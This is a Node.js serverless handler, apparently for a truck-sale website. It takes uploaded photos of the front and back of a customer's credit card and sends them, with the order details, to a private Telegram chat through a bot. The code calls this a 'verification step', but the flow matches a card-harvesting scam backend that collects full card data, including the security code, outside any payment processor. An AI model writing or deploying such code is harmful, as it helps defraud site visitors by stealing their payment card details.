// This file is api/telegram-upload.js

const { IncomingForm } = require('formidable');
const TelegramBot = require('node-telegram-bot-api');

// Initialize the bot using the SECURE environment variable
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Helper to process the multipart form data
const parseForm = (req) => {
    return new Promise((resolve, reject) => {
        // Configure formidable to handle the file upload
        const form = new IncomingForm({
            multiples: true,
            maxFileSize: 5 * 1024 * 1024 // Limit file size to 5MB
        });
        form.parse(req, (err, fields, files) => {
            if (err) return reject(err);
            resolve({ fields, files });
        });
    });
};

module.exports = async (req, res) => {
    res.setHeader('Content-Type', 'application/json');

    if (req.method !== 'POST') {
        res.status(405).json({ message: 'Method Not Allowed' });
        return;
    }

    if (!CHAT_ID || !process.env.TELEGRAM_BOT_TOKEN) {
        res.status(500).json({ message: 'Telegram configuration missing on server (Environment Variables). Check Vercel settings.' });
        return;
    }

    try {
        const { fields, files } = await parseForm(req);
        
        // Extract data (Note: fields are returned as arrays in formidable v3, so we get [0])
        const truckId = fields.truckId ? fields.truckId[0] : 'N/A';
        const truckName = fields.truckName ? fields.truckName[0] : 'Unknown Truck';
        const cardFrontFile = files.cardFront ? files.cardFront[0] : null;
        const cardBackFile = files.cardBack ? files.cardBack[0] : null;

        if (!cardFrontFile || !cardBackFile) {
            res.status(400).json({ message: 'Missing one or both credit card photos.' });
            return;
        }

        // 1. Create a unique Order ID
        const orderId = `TRUCK-${Date.now()}`;
        
        // 2. Send initial message to Telegram
        const message = `🚨 **NEW ORDER ALERT (Verification Step)** 🚨\n\n` + 
                        `**Truck:** ${truckName} (ID: ${truckId})\n` +
                        `**Order ID:** ${orderId}\n` +
                        `_Credit card images are attached for verification._`;

        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
        
        // 3. Send Card Front Picture
        await bot.sendPhoto(CHAT_ID, cardFrontFile.filepath, {
            caption: `Order ${orderId}: Credit Card Front Photo for ${truckName}`
        });

        // 4. Send Card Back Picture
        await bot.sendPhoto(CHAT_ID, cardBackFile.filepath, {
            caption: `Order ${orderId}: Credit Card Back Photo for ${truckName}`
        });

        // 5. Success Response
        // Return the Order ID so the website can continue the checkout flow
        res.status(200).json({ 
            message: 'Photos uploaded and sent to Telegram successfully!', 
            orderId: orderId 
        });

    } catch (error) {
        console.error('Telegram/Upload Error:', error);
        res.status(500).json({ message: 'Internal Server Error during file processing or Telegram transmission.' });
    }
};
